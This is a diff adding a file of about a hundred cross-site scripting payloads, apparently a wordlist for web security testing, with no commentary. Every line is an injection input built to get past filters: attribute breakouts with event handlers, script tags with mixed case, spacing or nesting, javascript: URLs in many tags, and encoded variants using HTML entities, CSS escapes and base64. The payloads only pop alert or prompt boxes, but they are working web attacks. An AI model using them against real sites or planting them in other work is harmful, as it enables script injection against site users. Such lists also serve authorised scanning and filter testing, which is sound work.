@@ -1,0 +1,109 @@
+" onfocus="alert(871)" autofocus "
+" onfocus="prompt(871)" autofocus "
+' onfocus='alert(871)" autofocus "
+" onfocus="prompt(871)" autofocus "
+' onfocus='&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x38;&#x37;&#x31;&#x29;
+" onfocus="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x38;&#x37;&#x31;&#x29;
+' onfocus='&#x70;&#x72;&#x6f;&#x6d;&#x70;&#x74;&#x28;&#x38;&#x37;&#x31;&#x29;
+" onfocus="&#x70;&#x72;&#x6f;&#x6d;&#x70;&#x74;&#x28;&#x38;&#x37;&#x31;&#x29;
+" onmouseover=alert(871) "
+" onmouseover=prompt(871) "
+' onmouseover=alert(871) '
+' onmouseover=prompt(871) '
+"><script>alert(871)</script><"q
+"><script>prompt(871)</script><"q
+'><script>alert(871)</script><'q
+'><script>prompt(871)</script><'q
+%3cscript%3ealert(871)%3c/script%3e
+%3cscript%3eprompt(871)%3c/script%3e
+<script>alert(871)</script>
+<script>prompt(871)</script>
+<ScRiPt>alert(871)</ScRiPt>
+<ScRiPt>prompt(871)</ScRiPt>
+<scr<script>ipt>alert(871)</script>
+<scr<script>ipt>prompt(871)</script>
+<script >alert(871)</script>
+<script >prompt(871)</script>
+<script >alert(871)</script >
+<script >prompt(871)</script >
+<IMG SRC="javascript:alert(871)">
+<IMG SRC="javascript:prompt(871)">
+<IMG SRC=javascript:alert(871)>
+<IMG SRC=javascript:prompt(871)>
+<IMG SRC="java script:alert(871)">
+<IMG SRC="java script:prompt(871)">
+<SCRIPT>alert(871)//<</SCRIPT>
+<SCRIPT>prompt(871)//<</SCRIPT>
+<SCRIPT <B>alert(871)</SCRIPT>
+<SCRIPT <B>prompt(871)</SCRIPT>
+<IMG SRC=javascript:alert('871')>
+<IMG SRC=javascript:prompt('871')>
+"><IMG SRC=JaVaScRiPt:alert('871')>
+"><IMG SRC=JaVaScRiPt:prompt('871')>
+<IMG SRC=`javascript:alert("test, '871'")`>
+<IMG SRC=`javascript:prompt("test, '871'")`>
+<IMG SRC=# onmouseover="alert('871')">
+<IMG SRC=# onmouseover="prompt('871')">
+<IMG onmouseover="alert('xxs')">
+<IMG onmouseover="prompt('xxs')">
+<IMG SRC=/ onerror="alert(871)"></img>
+<IMG SRC=/ onerror="prompt(871)"></img>
+<IMG SRC=/ onerror=prompt(871)></img>
+<IMG SRC=/ onerror=alert(871)></img>
+<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
+&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
+#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<a onmouseover="alert(871)">xxs link</a>
+<a onmouseover="prompt(871)">xxs link</a>
+<a onmouseover="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x38;&#x37;&#x31;&#x29;">xxs link</a>
+<a onmouseover="&#x70;&#x72;&#x6f;&#x6d;&#x70;&#x74;&#x28;&#x38;&#x37;&#x31;&#x29;">xxs link</a>
+<a onmouseover=alert(871)>xxs link</a>
+<a onmouseover=prompt(871)>xxs link</a>
+<i onclick=alert(871)>xss</i>
+<i onclick=prompt(871)>xss</i>
+<IMG SRC="jav&#x09;ascript:alert(871);">
+<IMG SRC="jav&#x09;ascript:prompt(871);">
+<IMG SRC=" &#14;  javascript:alert(871);">
+<IMG SRC=" &#14;  javascript:prompt(871);">
+";alert(871);//
+";prompt(871);//
+';alert(871);//
+';prompt(871);//
+</script><script>alert(871)</script>
+</script><script>prompt(871)</script>
+<INPUT TYPE="IMAGE" SRC="javascript:alert(871);">
+<INPUT TYPE="IMAGE" SRC="javascript:prompt(871);">
+<BODY BACKGROUND="javascript:alert(871)">
+<BODY BACKGROUND="javascript:prompt(871)">
+<IMG DYNSRC="javascript:alert(871)">
+<IMG DYNSRC="javascript:prompt(871)">
+<IMG SRC='vbscript:msgbox("871")'>
+<svg/onload=alert('XSS')>
+<svg/onload=prompt('XSS')>
+<BODY ONLOAD=alert('XSS')>
+<BODY ONLOAD=prompt('XSS')>
+<BGSOUND SRC="javascript:alert('XSS');">
+<BGSOUND SRC="javascript:prompt('XSS');">
+<BR SIZE="&{alert('XSS')}">
+<BR SIZE="&{prompt('XSS')}">
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+<LINK REL="stylesheet" HREF="javascript:prompt('XSS');">
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<STYLE>@im\port'\ja\vasc\ript:prompt("XSS")';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<IMG STYLE="xss:expr/*XSS*/ession(prompt('XSS'))">
+<XSS STYLE="xss:expression(alert('XSS'))">
+<XSS STYLE="xss:expression(prompt('XSS'))">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:prompt('XSS');">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+<DIV STYLE="width: expression(alert('XSS'));">
